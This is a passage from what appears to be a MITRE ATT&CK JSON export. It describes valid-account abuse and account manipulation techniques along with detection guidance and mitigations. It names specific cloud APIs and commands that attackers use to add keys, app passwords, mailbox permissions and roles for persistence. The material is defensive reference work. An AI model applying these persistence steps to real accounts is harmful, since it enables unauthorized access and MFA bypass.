minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) across all account types, including default, local, domain, and cloud accounts, to prevent unauthorized access, even if credentials are compromised. MFA provides a critical layer of security by requiring multiple forms of verification beyond just a password. This measure significantly reduces the risk of adversaries abusing valid accounts to gain initial access, escalate privileges, maintain persistence, or evade defenses within your network."},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}],"subTechniques":[{"id":"T1078.001","name":"Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Local Accounts Feb 2019)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Root User)</a> <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services. <a href=\"https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metasploit SSH Module)</a>\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called <code>vpxuser</code> is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via Exploitation for Credential Access on the vCenter host), they will then have access to the ESXi server. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> <a href=\"https://pentera.io/blog/information-disclosure-in-vmware-vcenter/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentera vCenter Information Disclosure)</a>","detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) for default accounts whenever possible to prevent unauthorized access, even if credentials for these accounts are compromised. MFA adds an additional layer of security that requires more than just a username and password, making it significantly harder for adversaries to exploit these accounts for initial access or lateral movement."}]},{"id":"T1078.002","name":"Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD Accounts)</a>\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd). <a href=\"https://ubuntu.com/server/docs/service-sssd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu SSSD Docs)</a> \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly review and manage domain accounts to ensure that only active, necessary accounts exist. Remove or disable inactive and unnecessary accounts to reduce the risk of adversaries abusing these accounts to gain unauthorized access or move laterally within the network."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained."},{"id":"M1027","name":"Password Policies","description":"Implement and enforce strong password policies for domain accounts to ensure passwords are complex, unique, and regularly rotated. This reduces the likelihood of password guessing, credential stuffing, and other attack methods that rely on weak or static credentials."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1078.003","name":"Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.","detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce user account management practices for local accounts to limit access and remove inactive or unused accounts. By doing so, you reduce the attack surface available to adversaries and prevent unauthorized access to local systems."},{"id":"M1026","name":"Privileged Account Management","description":"Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries. \n\nFor example, audit the use of service accounts in Kubernetes, and avoid automatically granting them access to the Kubernetes API if this is not required. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a> Implementing LAPS may also help prevent reuse of local administrator credentials across a domain. <a href=\"https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote Use of Local)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1032","name":"Multi-factor Authentication","description":"Enable multi-factor authentication (MFA) for local accounts to add an extra layer of protection against credential theft and misuse. MFA can be implemented using methods like mobile-based authenticators or hardware tokens, even in environments that do not rely on domain controllers or cloud services. This additional security measure can help reduce the risk of adversaries gaining unauthorized access to local systems and resources."}]},{"id":"T1078.004","name":"Cloud Accounts","description":"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. <a href=\"https://aws.amazon.com/identity/federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Identity Federation)</a> <a href=\"https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Federating GC)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Deploying AD Federation)</a>\n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to Steal Application Access Tokens to move laterally across the cloud environment. <a href=\"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Managed Identity 2022)</a>","detection":"Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Metadata","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Periodically review user accounts and remove those that are inactive or unnecessary. Limit the ability for user accounts to create additional accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access, such as Global Administrator and Privileged Role Administrator in Azure AD. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a> These reviews should also check if new privileged cloud accounts have been created that were not authorized. For example, in Azure AD environments configure alerts to notify when accounts have gone many days without using privileged roles, as these roles may be able to be removed. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Alerts for Azure AD Roles)</a> Consider using temporary, just-in-time (JIT) privileged access to Azure AD resources rather than permanently assigning privileged roles. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network. Passwords and access keys should be rotated regularly. This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge. Cloud service providers may track access key age to help audit and identify keys that may need to be rotated. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for cloud accounts, especially privileged accounts. This can be implemented in a variety of forms (e.g. hardware, virtual, SMS), and can also be audited using administrative reporting features. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}]}]},{"id":"T1098","name":"Account Manipulation","description":"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups. <a href=\"https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye SMOKEDHAM June 2021)</a> These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts.","detection":"Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft User Modified Event)</a> <a href=\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Event 4670)</a> <a href=\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Event 4670)</a> Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ <a href=\"https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: InsiderThreat ChangeNTLM July 2017)</a> or that include additional flags such as changing a password without knowledge of the old password. <a href=\"https://github.com/gentilkiwi/mimikatz/issues/92\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Mimikatz Issue 92 June 2017)</a>\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged Valid Accounts","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Active Directory: Active Directory Object Modification","File: File Modification","Group: Group Modification","User Account: User Account Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permissions to modify accounts or account-related policies."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access to potentially sensitive files that deal with authentication and/or authorization."},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1028","name":"Operating System Configuration","description":"Protect domain controllers by ensuring proper security configuration for critical servers to limit access by potentially unnecessary protocols and services, such as SMB file sharing."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary and potentially abusable authentication and authorization mechanisms where possible."}],"subTechniques":[{"id":"T1098.001","name":"Additional Cloud Credentials","description":"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.\n\nFor example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> <a href=\"https://speakerdeck.com/tweekfawkes/blue-cloud-of-death-red-teaming-azure-1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Blue Cloud of Death)</a> <a href=\"https://www.youtube.com/watch?v=wQ1CuAPnrLM&feature=youtu.be&t=2815\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Blue Cloud of Death Video)</a> These credentials include both x509 keys and passwords. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules. <a href=\"https://nedinthecloud.com/2019/07/16/demystifying-azure-ad-service-principals/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demystifying Azure AD Service Principals)</a>\n\nIn infrastructure-as-a-service (IaaS) environments, after gaining access through Cloud Accounts, adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP. <a href=\"https://cloud.google.com/sdk/gcloud/reference/compute/os-login/ssh-keys/add\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP SSH Key Add)</a> This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a> <a href=\"https://expel.io/blog/behind-the-scenes-expel-soc-alert-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel Behind the Scenes)</a>\n\nAdversaries may also use the <code>CreateAccessKey</code> API in AWS or the <code>gcloud iam service-accounts keys create</code> command in GCP to add access keys to an account. Alternatively, they may use the <code>CreateLoginProfile</code> API in AWS to add a password that can be used to log into the AWS Management Console for Cloud Service Dashboard. <a href=\"https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso Scattered Spider 2023)</a> <a href=\"https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lacework AI Resource Hijacking 2024)</a> If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e. Cloud Accounts). <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a> <a href=\"https://sysdig.com/blog/scarleteel-2-0/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig ScarletEel 2.0)</a> For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator. <a href=\"https://posts.specterops.io/azure-privilege-escalation-via-service-principal-abuse-210ae2be2a5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Azure Privilege Escalation)</a> \n\nIn AWS environments, adversaries with the appropriate permissions may also use the <code>sts:GetFederationToken</code> API call to create a temporary set of credentials to Forge Web Credentials tied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a>\n\nIn Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT42 Operations 2024)</a> As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset. <a href=\"https://learn.microsoft.com/en-us/entra/identity/authentication/howto-mfa-app-passwords\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Entra ID App Passwords)</a>","detection":"Monitor Azure Activity Logs for Service Principal and Application modifications. Monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account.\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.","platforms":["IaaS","Identity Provider","SaaS"],"dataSources":["User Account: User Account Modification","Active Directory: Active Directory Object Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that low-privileged user accounts do not have permission to add access keys to accounts. In AWS environments, prohibit users from calling the <code>sts:GetFederationToken</code> API unless explicitly required. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator or root accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1030","name":"Network Segmentation","description":"Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts. Consider enforcing multi-factor authentication for the <code>CreateKeyPair</code> and <code>ImportKeyPair</code> API calls through IAM policies. <a href=\"https://expel.io/blog/finding-evil-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel IO Evil in AWS)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary and potentially abusable authentication mechanisms where possible. For example, in Entra ID environments, disable the app password feature unless explicitly required."}]},{"id":"T1098.002","name":"Additional Email Delegate Permissions","description":"Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account. \n\nFor example, the <code>Add-MailboxPermission</code> PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox. <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - Add-MailboxPermission)</a> <a href=\"https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT35 2018)</a> <a href=\"https://www.crowdstrike.com/blog/hiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hiding in Plain Sight 2018)</a> In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings. <a href=\"https://support.google.com/a/answer/7223765?hl=en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gmail Delegation)</a> <a href=\"https://googleblog.blogspot.com/2011/06/ensuring-your-information-is-safe.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Ensuring Your Information is Safe)</a> \n\nAdversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders. <a href=\"https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Defend UNC2452 White Paper)</a>\n\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can add Additional Cloud Roles to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: Internal Spearphishing), so the messages evade spam/phishing detection mechanisms. <a href=\"https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bienstock, D. - Defending O365 - 2019)</a>","detection":"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\n\nEnable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None. \n\nA larger than normal volume of emails sent from an account and similar phishing emails sent from  real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.","platforms":["Windows","Office Suite"],"dataSources":["Group: Group Modification","Application Log: Application Log Content","User Account: User Account Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for user and privileged accounts."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"If email delegation is not required, disable it. In Google Workspace this can be accomplished through the Google Admin console. <a href=\"https://support.google.com/a/answer/7223765?hl=en\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gmail Delegation)</a>"}]},{"id":"T1098.003","name":"Additional Cloud Roles","description":"An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS IAM Policies and Permissions)</a> <a href=\"https://cloud.google.com/iam/docs/policies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud IAM Policies)</a> <a href=\"https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Support O365 Add Another Admin, October 2019)</a> <a href=\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft O365 Admin Roles)</a> With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins). <a href=\"https://expel.com/blog/incident-report-from-cli-to-console-chasing-an-attacker-in-aws/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Expel AWS Attacker)</a> <a href=\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft O365 Admin Roles)</a> \n\nThis account modification may immediately follow Create Account or other malicious account activity. Adversaries may also modify existing Valid Accounts that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account. <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" 